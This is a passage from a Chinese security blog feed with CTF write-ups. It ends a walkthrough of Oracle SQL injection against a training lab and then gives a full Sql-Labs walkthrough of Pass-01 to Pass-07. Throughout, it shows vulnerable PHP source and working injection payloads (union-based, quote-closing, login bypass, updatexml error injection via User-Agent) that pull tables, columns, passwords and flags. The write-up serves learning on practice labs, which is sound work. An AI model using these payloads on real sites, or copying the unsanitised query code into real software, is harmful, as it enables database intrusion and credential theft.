<li><strong>需要注意一点，这里不能直接用字符填上去，需要加上to_nchar()函数将输入的数据转换为字符串，不然oracle识别不出来会报错</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1.1 union all <span class="keyword">select</span> <span class="number">1</span>,to_nchar(<span class="string">'注入点'</span>),to_nchar(<span class="string">'注入点'</span>),<span class="number">4</span> <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727164907401.png" alt="image-20210727164907401"></p>
</blockquote>
<ul>
<li>爆表，<strong>别名爆表rownum法</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1.1 union all <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> n,to_nchar(table_name),to_nchar(<span class="string">'注入点'</span>),<span class="number">4</span> <span class="keyword">from</span> user_tables) <span class="keyword">where</span> n=<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727165117439.png" alt="image-20210727165117439"></p>
<ul>
<li><strong>NEWS明显不是我们想要的，下一个</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1.1 union all <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> n,to_nchar(table_name),to_nchar(<span class="string">'注入点'</span>),<span class="number">4</span> <span class="keyword">from</span> user_tables) <span class="keyword">where</span> n=<span class="number">3</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727165334321.png" alt="image-20210727165334321"></p>
<ul>
<li>爆字段也是一样找出了 UNAME，UPASS</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8808&#x2F;?id&#x3D;1.1 union all select * from (select rownum n,to_nchar(column_name),to_nchar(&#39;注入点&#39;),4 from user_tab_columns) where n&#x3D;1</span><br></pre></td></tr></table></figure></div>

<ul>
<li>拿密码</li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727165642817.png" alt="image-20210727165642817"></p>
<blockquote>
<ul>
<li>第二种方式，就是报错注入，需要了解一些函数<strong>ctxsys.drithsx.sn</strong></li>
</ul>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727170155105.png" alt="image-20210727170155105"></p>
</blockquote>
<ul>
<li>我们实验一下,直接显错出来</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> to_nchar(<span class="string">'显错点'</span>) <span class="keyword">from</span> dual))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727170820786.png" alt="image-20210727170820786"></p>
<ul>
<li>显示表</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> n, table_name <span class="keyword">from</span> user_tables) <span class="keyword">where</span> n=<span class="number">3</span>))</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727171247370.png" alt="image-20210727171247370"></p>
</blockquote>
<ul>
<li>显示字段</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> n, column_name <span class="keyword">from</span> user_tab_columns) <span class="keyword">where</span> n=<span class="number">2</span>))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727171406084.png" alt="image-20210727171406084"></p>
<blockquote>
<ul>
<li><strong>正式开始，学了这些知识，再去环境里面看看，怎么使用ctxsys.drithsx.sn来实现报错注入</strong></li>
</ul>
</blockquote>
<ul>
<li>查一下版本</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> banner <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">rownum</span> n, banner <span class="keyword">from</span> v$<span class="keyword">version</span>) <span class="keyword">where</span> n=<span class="number">1</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727171805739.png" alt="image-20210727171805739"></p>
</blockquote>
<ul>
<li><strong>查一下表，根据我们上面用的知识</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> table_name <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">rownum</span> n, table_name <span class="keyword">from</span> user_tables) <span class="keyword">where</span> n=<span class="number">3</span>))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727171912981.png" alt=""></p>
<ul>
<li><strong>查字段一样，根据更改n的数值来顺序查询，找到UNAME,UPASS</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> column_name <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">rownum</span> n, column_name <span class="keyword">from</span> user_tab_columns) <span class="keyword">where</span> n=<span class="number">2</span>))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727172429272.png" alt="image-20210727172429272"></p>
<ul>
<li><strong>查flag</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8808&#x2F;?id&#x3D;1 and 1&#x3D;ctxsys.drithsx.sn(1,(select upass from(select rownum n, upass from admin) where n&#x3D;2))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727172631000.png" alt="image-20210727172631000"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>封神台</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】Sql-Labs wp</title>
    <url>/posts/91.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场Sql-Labs，练练手！</li>
<li>环境：<a href="http://inject2.lab.aqlab.cn:81/" target="_blank" rel="noopener">http://inject2.lab.aqlab.cn:81/</a></li>
</ul>
</blockquote>
<h1 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from user where id='</span>.$id;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>显错注入、先判断多少个字段</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725131955354.png" alt="image-20210725131955354"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725132104676.png" alt="image-20210725132104676"></p>
<blockquote>
<ul>
<li><strong>查表</strong>拓展： 1 and exists(select * from user)这种形式可以猜解表是否存在</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>();</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725132232796.png" alt="image-20210725132232796"></p>
<blockquote>
<ul>
<li><strong>查flag表中字段</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> f.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="number">0x6572726f725f666c6167</span>; </span><br><span class="line">//0x6572726f725f666c6167是error_flag的十六进制</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725132608204.png" alt="image-20210725132608204"></p>
<blockquote>
<ul>
<li><strong>拿flag //后面就不截图了</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> error_flag;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725132743133.png" alt="image-20210725132743133"></p>
<h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from user where id='</span>\<span class="string">''</span>.$id.<span class="string">'\''</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>给id传参加了个单引号，和上题一样的做法差不多，就是1后面加个’来闭合源代码中的单引号，再加个#号url编码也就是%23注释掉后面的单引号，也就可以联合查询了</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-02/index.php?id=1' union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> error_flag %<span class="number">23</span>;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725133156333.png" alt="image-20210725133156333"></p>
<h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">sername = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from user where id='</span>(\<span class="string">''</span>.$id.<span class="string">'\')'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>上题id是’id’这题是加了个括号(‘id’)，不过意思不变，同样是进行构造’)在1后面然后利用注释符#来绕过也就是%23</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-03/index.php?id=1') union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> error_flag %<span class="number">23</span>;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725134152613.png" alt="image-20210725134152613"></p>
<h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from user where id=("'</span>.$id.<span class="string">'")'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>单引号变双引号</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//inject2.lab.aqlab.cn:81/Pass-04/index.php?id=1") union all select 1,2,flag from error_flag %23;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725134258334.png" alt="image-20210725134258334"></p>
<h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">'select *from user where username =\''</span>.$username.<span class="string">'\' and password=\''</span>.$password.<span class="string">'\''</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'******'</span>); <span class="comment">//不想告诉你们库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录Your Login name:'</span>.$uname.<span class="string">'Your Password:'</span>.$passwd.<span class="string">''</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">'账号密码错误'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>先用万能密码登陆，获取账号和密码，然后再post注入，利用联合查询生成其他的账号和密码使回显成功，最后用limit 1,1 显示第二行也就是我们联合查询加入进去的账号和密码，然后再注入和上面四题没区别</strong></li>
</ul>
</blockquote>
<ul>
<li>万能密码登陆</li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725141449607.png" alt="image-20210725141449607"></p>
<blockquote>
<ul>
<li><strong>用Hackbard的post注入，找到回显点</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=as4dsa2dsad2a3'  union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725141606362.png" alt="image-20210725141606362"></p>
<blockquote>
<ul>
<li>表</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=as4dsa2dsad2a3'  union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725141943040.png" alt="image-20210725141943040"></p>
<blockquote>
<ul>
<li><strong>字段</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=as4dsa2dsad2a3'  union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'flag'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725142047502.png" alt="image-20210725142047502"></p>
<blockquote>
<ul>
<li>拿flag</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin&amp;password&#x3D;as4dsa2dsad2a3&#39;  union all select 1,2,flag from flag limit 1,1#</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725142133255.png" alt="image-20210725142133255"></p>
<h1 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">'select *from user where username =("'</span>.$username.<span class="string">'") and password=("'</span>.$password.<span class="string">'")'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'******'</span>); <span class="comment">//不想告诉你们库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录Your Login name:'</span>.$uname.<span class="string">'Your Password:'</span>.$passwd.<span class="string">''</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">'账号密码错误'</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>双引号后面加个括号</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=as4dsa2dsad2a3")  union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> flag <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725142450880.png" alt="image-20210725142450880"></p>
<h1 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$jc = $username.$password;</span><br><span class="line">$sql = <span class="string">'select *from user where username =\''</span>.$username.<span class="string">'\' and password=\''</span>.$password.<span class="string">'\''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/.*\'.*/'</span>,$jc)!== <span class="number">0</span>)&#123;<span class="keyword">die</span>(<span class="string">'为了网站安全性，禁止输入某些特定符号'</span>);&#125;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">//不想告诉你库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">$uname = $row[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line">$Insql = <span class="string">"INSERT INTO uagent (`uagent`,`username`) VALUES ('$uagent','$uname')"</span>;</span><br><span class="line">$result1 = mysqli_query($conn,$Insql);</span><br><span class="line">print_r(mysqli_error($conn));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'成功登录'</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>过滤了单引号，万能密码登陆没用了，看到user_agent的head头中被安插在插入语句中，可以直接sqlmap跑*加包，或者第二种方法用burp跑出密码登陆，再UA中填updatexml来报错直接页面上显示uA中语句错误，第一种方法无脑，就不做了</strong></li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><strong>账号和密码是admin和123456，看源码得知，必须登陆才能执行user-agent下面的语句，$row必须不为空，所以想要报错注入，就必须能登陆成功</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>登陆成功抓个包</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725150453588.png" alt="image-20210725150453588"></p>
<blockquote>
<ul>
<li>拼接一个完整的insert 并且在其中写一个updatexml报错注入</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">'or updatexml(1,concat(0x7e,user()),1),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725152021021.png" alt="image-20210725152021021"></p>
<blockquote>
<ul>
<li>取表</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725152142821.png" alt="image-20210725152142821"></p>
<blockquote>
<ul>
<li>取字段和flag</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'flag_head'</span>)),<span class="number">1</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725152328201.png" alt="image-20210725152328201"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#39;or updatexml(1,concat(0x7e,(select group_concat(flag_h1) from flag_head)),1),1)#</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725152450350.png" alt="image-20210725152450350"></p>
